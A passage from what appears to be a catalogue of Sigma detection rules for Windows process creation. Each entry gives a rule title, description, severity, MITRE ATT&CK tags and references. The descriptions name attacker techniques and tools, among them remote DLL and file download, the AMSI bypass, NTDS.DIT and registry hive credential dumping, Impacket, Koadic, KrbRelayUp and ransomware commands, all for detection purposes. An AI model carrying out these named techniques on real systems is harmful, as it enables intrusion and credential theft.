    An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_winzip.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

    
### Suspicious Double Extension
    
    Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_double_extension.yml
* https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html

* https://twitter.com/blackorbird/status/1140519090961825792

    
### Domain Trust Discovery
    
    Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1482
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_trust_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md

* https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html

* https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/

* https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

* https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/

    
### Suspicious Msiexec Execute Arbitrary DLL
    
    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)


    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

    
### Monitoring For Persistence Via BITS
    
    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished. When the job runs on the system the command specified in the BITS job will be executed. This can be abused by actors to create a backdoor within the system and for persistence. It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_monitoring_for_persistence_via_bits.yml
* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

* http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html

* https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394

    
### WSF/JSE/JS/VBA/VBE File Execution
    
    Detects suspicious file execution by wscript and cscript

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_script_execution.yml
    
### Greenbug Campaign Indicators
    
    Detects tools and process executions as observed in a Greenbug campaign in May 2020

    * Level: critical
    * MITRE: attack.g0049
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_greenbug_may20.yml
* https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia

    
### Procdump Usage
    
    Detects uses of the SysInternals Procdump utility

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_procdump.yml
* Internal Research

    
### Renamed PowerShell
    
    Detects the execution of a renamed PowerShell often used by attackers or malware

    * Level: critical
    * MITRE: car.2013-05-009
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_powershell.yml
* https://twitter.com/christophetd/status/1164506034720952320

    
### Modification Of Existing Services For Persistence
    
    Detects modification of an existing service on a compromised host in order to execute an arbitrary payload when the service is started or killed as a method of persistence.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1543.003
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_modif_of_services_for_via_commandline.yml
* https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/

    
### Koadic Execution
    
    Detects command line parameters used by Koadic hack tool

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_koadic.yml
* https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/

* https://github.com/zerosum0x0/koadic/blob/master/data/stager/js/stdlib.js#L955

* https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/

    
### Impacket Tool Execution
    
    Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1557.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_impacket_compiled_tools.yml
* https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries

    
### Execution via CL_Invocation.ps1
    
    Detects Execution via SyncInvoke in CL_Invocation.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cl_invocation_lolscript.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml

* https://twitter.com/bohops/status/948061991012327424

    
### PowerShell DownloadFile
    
    Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.command_and_control
    * MITRE: attack.t1104
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ps_downloadfile.yml
* https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html

    
### Suspicious Splwow64 Without Params
    
    Detects suspicious Splwow64.exe process without any command line parameters

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_splwow64.yml
* https://twitter.com/sbousseaden/status/1429401053229891590?s=12

    
### Conti Backup Database
    
    Detects a command used by conti to dump database

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_conti_sqlcmd.yml
* https://twitter.com/vxunderground/status/1423336151860002816?s=20

* https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection

* https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15

    
### Scheduled Task WScript VBScript
    
    Detects specific process parameters as used by ACTINIUM scheduled task persistence creation.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1053
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_actinium_persistence.yml
* https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations

    
### Suspicious Script Execution From Temp Folder
    
    Detects a suspicious script executions from temporary folder

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_temp.yml
* https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/

    
### Finger.exe Suspicious Invocation
    
    Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_finger_usage.yml
* https://twitter.com/bigmacjpg/status/1349727699863011328?s=12

* https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/

* http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt

    
### Reconnaissance Activity with Net Command
    
    Detects a set of commands often used in recon stages by different attack groups

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087
    * MITRE: attack.t1082
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_commands_recon_activity.yml
* https://twitter.com/haroonmeer/status/939099379834658817

* https://twitter.com/c_APT_ure/status/939475433711722497

* https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html

    
### Suspicious Execution of Hostname
    
    Use of hostname to get information

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_hostname.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname

    
### False Sysinternals Suite Tools
    
    Rename as a legitim Sysinternals Suite tools to evade detection

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_false_sysinternalsuite.yml
* https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite

    
### Ryuk Ransomware
    
    Detects Ryuk Ransomware command lines

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1204
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_ryuk.yml
* https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/

    
### Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)
    
    Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ntdsutil.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm

    
### Accesschk Usage After Privilege Escalation
    
    Accesschk is an access and privilege audit tool developed by SysInternal and often being used by attacker to verify if a privilege escalation process successful or not

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_accesschk_usage_after_priv_escalation.yml
* https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-43-638.jpg

    
### DevInit Lolbin Download
    
    Detects a certain command line flag combination used by devinit.exe lolbin to download arbitrary MSI packages on a Windows system

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_devinit_lolbin.yml
* https://twitter.com/mrd0x/status/1460815932402679809

    
### Netsh RDP Port Opening
    
    Detects netsh commands that opens the port 3389 used for RDP, used in Sarwent Malware

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_allow_port_rdp.yml
* https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/

    
### Disabled Volume Snapshots
    
    Detects commands that temporarily turn off Volume Snapshots

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_volsnap_disable.yml
* https://twitter.com/0gtweet/status/1354766164166115331

    
### Powershell AMSI Bypass via .NET Reflection
    
    Detects Request to amsiInitFailed that can be used to disable AMSI Scanning

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_amsi_bypass.yml
* https://twitter.com/mattifestation/status/735261176745988096

* https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120

    
### PowerShell Script Run in AppData
    
    Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ps_appdata.yml
* https://twitter.com/JohnLaTwC/status/1082851155481288706

* https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03

    
### Covenant Launcher Indicators
    
    Detects suspicious command lines used in Covenant luanchers

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1059.001
    * MITRE: attack.t1564.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_covenant.yml
* https://posts.specterops.io/covenant-v0-5-eee0507b85ba

    
### RdrLeakDiag Process Dump
    
    Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proc_dump_rdrleakdiag.yml
* https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/

    
### Suspicious Schtasks Execution AppData Folder
    
    Detects the creation of a schtask that executes a file from C:\Users\<USER>\AppData\Local

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_schtasks_appdata_local_system.yml
* https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/

    
### Trickbot Malware Recon Activity
    
    Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes. This detectors attempts to identify that activity based off a command rarely observed in an enterprise network.

    * Level: critical
    * MITRE: attack.discovery
    * MITRE: attack.t1482
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_trickbot_recon_activity.yml
* https://www.sneakymonkey.net/2019/05/22/trickbot-analysis/

* https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/

    
### UAC Bypass Using NTFS Reparse Point - Process
    
    Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_ntfs_reparse_point.yml
* https://github.com/hfiref0x/UACME

    
### Remote Desktop Protocol Use Mstsc
    
    Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mstsc.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc

    
### Suspicious UltraVNC Execution
    
    Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.g0047
    * MITRE: attack.t1021.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/process_creation_apt_gamaredon_ultravnc.yml
* https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf

* https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution

    
### Modifies the Registry From a File
    
    Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files.

    * Level: low
    * MITRE: attack.t1112
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regini.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini

    
### Net.exe Execution
    
    Detects execution of Net.exe, whether suspicious or benign.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1007
    * MITRE: attack.t1049
    * MITRE: attack.t1018
    * MITRE: attack.t1135
    * MITRE: attack.t1201
    * MITRE: attack.t1069.001
    * MITRE: attack.t1069.002
    * MITRE: attack.t1087.001
    * MITRE: attack.t1087.002
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.s0039
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

* https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html

* https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html

* https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe

    
### Execution from Suspicious Folder
    
    Detects a suspicious execution from an uncommon folder

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_execution_path.yml
* https://github.com/mbevilacqua/appcompatprocessor/blob/master/AppCompatSearch.txt

* https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses

* https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/

* https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/suspicious_process_creation_via_windows_event_logs.md

    
### High Integrity Sdclt Process
    
    A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_high_integrity_sdclt.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/6

* https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html

    
### Suspicious Execution of Taskkill
    
    Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1489
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_taskkill.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1489/T1489.md#atomic-test-3---windows---stop-service-by-killing-process

    
### Scheduled Task Executing Powershell Encoded Payload from Registry
    
    Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml
* https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/

    
### Always Install Elevated MSI Spawned Cmd And Powershell
    
    This rule looks for Windows Installer service (msiexec.exe) spawned command line and/or powershell

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_always_install_elevated_msi_spawned_cmd_powershell.yml
* https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg

    
### Zip A Folder With PowerShell For Staging In Temp
    
    Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1074.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_zip_compress.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md

    
### Sofacy Trojan Loader Activity
    
    Detects Trojan loader activity as used by APT28

    * Level: critical
    * MITRE: attack.g0007
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.defense_evasion
    * MITRE: car.2013-10-002
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_sofacy.yml
* https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/

* https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100

* https://twitter.com/ClearskySec/status/960924755355369472

    
### KrbRelayUp Hack Tool
    
    Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1550.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_krbrelayup.yml
* https://github.com/Dec0ne/KrbRelayUp

    
### Suspicious WebDav Client Execution
    
    A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_webdav_client_execution.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/17

* https://threathunterplaybook.com/evals/apt29/detections/7.B.4_C10730EA-6345-4934-AA0F-B0EFCA0C4BA6.html

    
### Discovery of a System Time
    
    Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1124
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_remote_time_discovery.yml
* https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1124/T1124.md

    
### MpiExec Lolbin
    
    Detects a certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_mpiexec_lolbin.yml
* https://twitter.com/mrd0x/status/1465058133303246867

* https://docs.microsoft.com/en-us/powershell/high-performance-computing/mpiexec?view=hpc19-ps

    
### Suspicious GrpConv Execution
    
    Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbins_susp_grpconv.yml
* https://twitter.com/0gtweet/status/1526833181831200770

    
### Root Certificate Installed
    
    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_root_certificate_installed.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md

    
### AdFind Usage Detection
    
    AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1482
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_ad_find_discovery.yml
* https://thedfirreport.com/2020/05/08/adfind-recon/

* https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/

* https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/

    
### Findstr Launching .lnk File
    
    Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1202
    * MITRE: attack.t1027.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_findstr_lnk.yml
* https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/

    
### Application Executed Non-Executable Extension
    
    Detects the execution of rundll32 with a command line that doesn't contain a .dll file

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_run_executable_invalid_extension.yml
* https://twitter.com/mrd0x/status/1481630810495139841?s=12

    
### Suspicious Process Patterns NTDS.DIT Exfil
    
    Detects suspicious process patterns used in NTDS.DIT exfiltration

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ntds.yml
* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

* https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/

* https://pentestlab.blog/tag/ntds-dit/

* https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1

* https://github.com/zcgonvh/NTDSDumpEx

* https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/NTDSgrab.ps1

    
### Suspicious Reg Add Open Command
    
    Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_reg_open_command.yml
* https://thedfirreport.com/2021/12/13/diavol-ransomware/

    
### Suspicious RazerInstaller Explorer Subprocess
    
    Detects a explorer.exe sub process of the RazerInstaller software which can be invoked from the installer to select a different installation folder but can also be exploited to escalate privileges to LOCAL SYSTEM

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1553
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_razorinstaller_explorer.yml
* https://twitter.com/j0nh4t/status/1429049506021138437

* https://streamable.com/q2dsji

    
### Invoke-Obfuscation CLIP+ Launcher
    
    Detects Obfuscated use of Clip.exe to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Regsvr32 HTTP IP Pattern
    
    Detects a certain command line flag combination used by regsvr32 when used to download and register a DLL from a remote address which uses HTTP (not HTTPS) and a IP address and not FQDN

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_http_pattern.yml
* https://twitter.com/mrd0x/status/1461041276514623491c19-ps

* https://twitter.com/tccontre18/status/1480950986650832903

    
### Suspicious PowerShell Command Line
    
    Detects the PowerShell command lines with special characters

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=64

    
### Dism Remove Online Package
    
    Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images

    * Level: medium
    * MITRE: attack.defense_evasion
